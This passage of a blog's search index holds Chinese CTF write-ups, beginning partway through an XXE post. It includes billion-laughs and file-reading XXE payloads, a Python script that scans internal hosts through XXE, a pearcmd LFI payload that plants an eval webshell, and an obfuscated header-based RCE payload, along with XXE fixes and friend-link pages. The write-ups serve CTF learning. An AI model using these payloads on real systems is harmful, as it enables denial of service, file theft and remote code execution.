\"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"> <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"> <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"> <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"> <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"> <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"> <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]> \n<lolz>&lol9;</lolz>\n<--XML解析器尝试解析该文件时，由于DTD的定义指数级展开（即递归引用),举个例子，这里定义了一个lol的实体，实体还有“lol”的字符串，然后定义了一个lol2的实体，里面有10个\"lol\"的字符串，依次递推，一个lol3实体引用10个lol2实体，这样的话可以一直向服务器传输文件，也就是形成了DOS攻击，经过XML解析器解析后的内存占用会比其本身大的多。-->\n```\n\n### 内网扫描\n\n```xml-dtd\n<?xml version=\"1.0\" ?>\n<!DOCTYPE xxe[\n<!ENTITY xxe SYSTEM \"file://proc/net/fib_trie\">\n<user>&xxe</user>\n]>\nfile:///etc/hosts 储存域名解析的缓存\n\nfile:///proc/net/arp arp表，可以获得内网其他机器的地址\n\nfile:///proc/net/tcp\n\nfile:///proc/net/udp\n\nfile:///proc/net/dev\n\nfile:///proc/net/fib_trie 路由缓存\n\nfile:///etc/passwd 用户密码\n\n```\n\n### 内网扫描脚本（借用[大佬的脚本](https://www.cnblogs.com/Article-kelp/p/16026652.html)）\n\n```python\n\nimport requests as res\nurl=\"http://185729a2-949c-44fb-ac39-c16282525e73.node5.buuoj.cn:81/doLogin.php\"\nrawPayload='<?xml version=\"1.0\"?>'\\\n         '<!DOCTYPE note ['\\\n         '<!ENTITY payload SYSTEM \"http://10.244.80.{}\">'\\\n         ']>'\\\n         '<user>'\\\n         '<username>'\\\n         '&payload;'\\\n         '</username>'\\\n         '<password>'\\\n         '123'\\\n         '</password>'\\\n         '</user>'\nfor i in range(1,256):\n    payload=rawPayload.format(i)\n    #payload=rawPayload\n    print(str(\"#{} =>\").format(i),end='')\n    try:\n        resp=res.post(url,data=payload,timeout=0.5)\n    except:\n        continue\n    else:\n        print(resp.text,end='')\n    finally:\n        print('')\n```\n\n### 修复方案\n\n```\nxxe修复\n\n方案：使用开发语言提供的禁用外部实体的方法\n\n1.PHP：\nlibxml\\_disable\\_entity\\_loader(true);//设置为true时禁止解析xml外部实体\n\n2.JAVA:\nDocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n\n3.Python：\nfrom lxml import etree\nxmlData=etree.parse(xmlSource,etree.XMLParser(resolve\\_entities=False))\n```\n\n\n\n## 参考文章：\n\n[XXE漏洞-再简单一点点](https://www.cnblogs.com/happystudyhuan/p/11774626.html)\n\n[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)\n\n[XXE外部实体注入漏洞——PHP](https://blog.51cto.com/u_13953961/3107472)\n\n[php xxe注入,XXE的原理利用方式及修复](https://blog.csdn.net/weixin_26750831/article/details/115201337?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172050770116800211510330%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172050770116800211510330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-115201337-null-null.142^v100^pc_search_result_base2&utm_term=php%20xxe&spm=1018.2226.3001.4187)\n\n[渗透攻击零基础学习-XXE（非常详细）零基础入门到精通，收藏这一篇就够了！！！](https://blog.csdn.net/logic1001/article/details/136590382?ops_request_misc=&request_id=&biz_id=102&utm_term=php%20xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-136590382.142^v100^pc_search_result_base2&spm=1018.2226.3001.4187)\n\n[BUUCTF题解 NCTF2019 True XML cookbook--Article](https://www.cnblogs.com/Article-kelp/p/16026652.html)\n\n[[NCTF2019]True XML cookbook 1-peekaboo](https://peekaboo.show/untitled-7/)\n\n[XXE漏洞-内网探测](https://blog.csdn.net/weixin_43221560/article/details/108152738)\n\n","tags":["-xxe"]},{"title":"[NewStarCTF 2023 公开赛道]Include 🍐--LFI to RCE","url":"/2024/07/10/NewStarCTF-2023-公开赛道-Include-🍐-LFI-to-RCE/","content":"\n# [NewStarCTF 2023 公开赛道]Include 🍐\n\n上来看到源码如下\n\n```php\n <?php\n    error_reporting(0);\n    if(isset($_GET['file'])) {\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {\n            die('hacker!');\n        }\n        \n        include($file.\".php\");\n        # Something in phpinfo.php!\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n?> \n```\n\n传一个phpinfo看看是什么\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101549638.png)\n\n一个假的flag，不过这是个提示，那我们看一下register_argc_argv是什么玩意\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101552331.png)\n\n开启状态，那我就得查查资料了，这个register_argc_argv的作用\n\n直接放文章链接：https://cloud.tencent.com/developer/article/2204400     https://www.cnblogs.com/Yu--/p/15788689.html      https://blog.csdn.net/weixin_53090346/article/details/127241278\n\n这个主要是用的是包含pearcmd.php这个文件来执行命令，然后借用大佬的图哈\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101557767.png)\n\n可以看到，里面有一个config-create参数，这个就是去创建文件的命令，不过要用+来隔开（底层原因：https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi%3Domq7qGNDQieiKO%2BmjowcGAbD#toc-0）\n\n```php\n所以，构造我们的payload\n?file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+./a.php\n不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101614305.png)\n\n注意：用BP进行操作，不然在浏览器中<>就会被URL编码，就会导致我们的马不管用了\n\n然后，POST传入执行命令\n\n```php\n?file=./a\nPOST:a=system(\"cat /f*\");\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101621878.png)\n\n本题考查的是LFI文件包含和RCE的结合，关键点是在pearcmd.php上，不过这种使用方法只能是register_argc_argv开启状态才行。不过如果可以上传文件的话，可以进行上传容器配置文件来改变关闭状态（参考：https://cloud.tencent.com/developer/article/2204400）\n\n当然，LFI可以做的事还很多比如还可以提权（参考文章:https://www.freebuf.com/articles/web/253102.html）","tags":["LFI","RCE"]},{"title":"[极客大挑战 2020]Roamphp4-Rceme WP","url":"/2024/06/05/极客大挑战-2020-Roamphp4-Rceme-WP/","content":"\n# [极客大挑战 2020]Roamphp4-Rceme\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png)\n\n进入题目，可以看到，大概意思就是如果code的md5值前5位是3e16b，那么就会执行命令\n\n这边给出一个md5生成脚本\n\n```python\nimport hashlib\n\ni = 0\nwhile True:\n    if hashlib.md5(str(i).encode('utf-8')).hexdigest()[0:5] == '0e788':\n        print(i)\n        break\n    i = i + 1\n```\n\n查看源码，发现提示\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png)\n\n```sh\nvim swp，.swp文件是vim使用不当而生成的一个文件，这种文件一般都是“坏的”，查看原来内容需要vim -r\n要直接用 Vim 打开一个 .swp 文件，你可以采取以下步骤。一般情况下，.swp 文件是二进制文件，直接编辑它并不常见，但你可能会希望查看其内容。\n\n1. 打开 .swp 文件\n你可以用 vim 命令直接打开 .swp 文件。例如：\nvim example.txt.swp\n\n2. 使用 :recover 命令恢复文件\n如果你的目的是从交换文件中恢复数据，可以使用 :recover 命令。假设你有一个交换文件 example.txt.swp，你可以这样做：\nvim -r example.txt\n\n3. 手动打开 .swp 文件查看内容\n如果你只想查看 .swp 文件的内容，尽管它是二进制文件，你可以使用 Vim 的二进制模式来查看。注意，这不是常见操作，而且通常不会有很好的阅读体验，但可以帮助你检查交换文件的一些细节。步骤如下：\nvim -b example.txt.swp\n\n在 Vim 中，使用以下命令可以切换到十六进制模式，这样你可以更方便地查看二进制内容：\n:%!xxd\n\n要返回普通模式，可以使用：\n:%!xxd -r\n\n4. 使用 xxd 查看 .swp 文件\n你也可以使用 xxd 命令来查看 .swp 文件的内容：\nxxd example.txt.swp | less\n这会将 .swp 文件转换为十六进制显示，便于查看。\n\n5. 确定如何处理 .swp 文件\n大多数情况下，你需要根据 Vim 的提示来决定如何处理 .swp 文件。例如，当你尝试打开一个文件时，Vim 会提示交换文件已经存在，并给出几种处理选项：\n\nO: 只读打开文件。\nE: 继续编辑文件，忽略交换文件。\nR: 恢复文件，尝试从交换文件中恢复数据。\nD: 删除交换文件，通常在确认没有其他 Vim 实例在编辑该文件时使用。\nQ: 退出，不进行任何操作。\nA: 中止操作，类似于退出。\n选择适当的选项，处理交换文件后再继续编辑主文件。\n\n通过这些方法，你可以用 Vim 打开和查看 .swp 文件。要特别注意的是，.swp 文件主要用于 Vim 的数据恢复，所以一般不建议直接编辑它们，而是通过恢复和处理的方式进行操作。\n```\n\n然后，我们直接访问/.index.php.swp\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png)\n\n在kali中打开 vim -r index.php.swp\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png)\n\n源码如上\n\n```\nsubstr(md5(mt_rand() . sha1(mt_rand())), 0, 5) 是一段 PHP 代码，用于生成一个长度为 5 的随机字符串。下面是这段代码的具体解析：\n\nmt_rand():\n\nmt_rand() 是一个生成随机整数的函数，基于 Mersenne Twister 算法，比 rand() 更快并且提供更高的随机性。\n该函数会返回一个介于 0 和 RAND_MAX 之间的随机整数。\nsha1(mt_rand()):\n\n生成一个随机整数，然后计算其 SHA-1 哈希值。\nSHA-1 哈希值是一个 40 字符的十六进制字符串。\n连接随机值和 SHA-1 哈希值:\n\nmt_rand() . sha1(mt_rand()) 生成两个随机整数，并将它们的值连接起来。\nmd5():\n\n对连接后的字符串计算其 MD5 哈希值。\nMD5 哈希值是一个 32 字符的十六进制字符串。\nsubstr():\n\n从生成的 MD5 哈希值中提取前 5 个字符。\n组合起来，代码的具体执行顺序如下：\n\n调用 mt_rand() 生成一个随机整数。\n调用 sha1() 生成另一个随机整数的 SHA-1 哈希值。\n将这两个值连接起来形成一个字符串。\n计算这个字符串的 MD5 哈希值。\n从 MD5 哈希值中提取前 5 个字符。\n因此，代码的作用是生成一个相对随机的 5 字符长的字符串\n```\n\n可以看到进行了长度限制和过滤，并且那个md5值也在变化。\n\n```php\n前置知识：\n\n('phpinfo')()\n['phpinfo'][0]()\n['phpinfo']{0}()\n效果作用是一样的。\n\nphpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();\n加这个[~%FF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]\n\ngetallheaders() 获取所有 HTTP 头信息，返回一个关联数组。\nnext() 试图将数组的内部指针移动到下一个元素，并返回该元素的值。\n\n假设 HTTP 头包含以下信息：\nArray\n(\n    [Host] => example.com\n    [User-Agent] => Mozilla/5.0\n    [Accept] => text/html\n    [Connection] => keep-alive\n)\n当你执行 next(getallheaders()) 时：\n\n<?php\n$headers = getallheaders(); // 获取所有 HTTP 头信息\n$nextHeader = next($headers); // 将指针移动到下一个元素，并返回该元素的值\necho $nextHeader;\n?>\n在这个示例中，$nextHeader 将包含 Mozilla/5.0，因为这是数组中的第二个元素。\n```\n\n因为UA是可控的，所以一般在UA进行RCE\n\n然后，我们抓包看一下\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png)\n\n在第二位，所以构造语句拿到http头，并且执行在UA中的命令\n\n```php\n即：system(next(getallheaders()))\n```\n\n然后，进行取反绕过\n\n```\n[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png)\n\n查看效果\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png)\n\n然后，直接cat /flll1114gggggg\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png)\n\n参考：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"},{"title":"友链","url":"/link/index.html","content":"\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>个人资料</title>\n    <style>\n        body {\n            font-family: \"微软雅黑\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>个人资料</title>\n    <style>\n        body {\n            font-family: \"微软雅黑\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>个人资料</title>\n    <style>\n        body {\n            font-family: \"微软雅黑\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<div class=\"container\">\n    <!-- 个人资料 1 -->\n    <div class=\"profile-card\">\n        <img src=\"https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407102114048.jpeg\" alt=\"p0l1st Avatar\">\n        <div class=\"info\">\n            <a href=\"http://blog.p0l1st.top/\" target=\"_blank\">p0l1st</a>\n            <p class=\"descr\">别急，又急</p>\n            <p class=\"targs\">Web</p>\n        </div>\n    </div>\n\t<div class=\"profile-card\">\n        <img src=\"https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412132119611.jpg\" alt=\"CH13hh Avatar\">\n        <div class=\"info\">\n            <a href=\"https://ch13hh.github.io/\" target=\"_blank\">CH13hh</a>\n            <p class=\"descr\">The best way to predict the future is to create it.</p>\n            <p class=\"targs\">Pwn</p>\n        </div>\n    </div>\n    <div class=\"profile-card\">\n        <img src=\"https://yliken.github.io/img/essayhead/second.jpg\" alt=\"yliken Avatar\">\n        <div class=\"info\">\n            <a href=\"https://yliken.github.io/\" target=\"_blank\">yliken</a>\n            <p class=\"descr\">红豆生南国 春来发几枝 愿君多采撷 此物最相思</p>\n            <p class=\"targs\">Web</p>\n        </div>\n    </div>\n    <div class=\"profile-card\">\n        <img src=\"https://pfwqdxwdd.github.io/img/favicon.png\" alt=\"pfwqdxwdd Avatar\">\n        <div class=\"info\">\n            <a href=\"https://pfwqdxwdd.github.io/\" target=\"_blank\">pfwqdxwdd</a>\n            <p class=\"descr\">PWN!</p>\n            <p class=\"targs\">Pwn</p>\n        </div>\n    </div>\n    </div>\n    </body>\n    </html>\n\n\n\n\n\n"},{"title":"about","url":"/about/index.html","content":"\nNOthing................\n\n# \tfriends\n\n​\t[p0l1st](http://blog.p0l1st.top/) \t别急，又急\ttag：web\n\n​\t[CH13hh](https://ch13hh.github.io/) \tThe best way to predict the future is to create it.\ttag：pwn\n\n​\t[yliken](https://yliken.github.io/)\t红豆生南国 春来发几枝 愿君多采撷 此物最相思\ttag：web\n\n​\t[pfwqdxwdd](https://pfwqdxwdd.github.io/)\tPWN!\ttag：pwn\n\n​\t\n\n"},{"title":"categories","url":"/categories/index.html"},{"title":"tags","url":"/tags/index.html"}]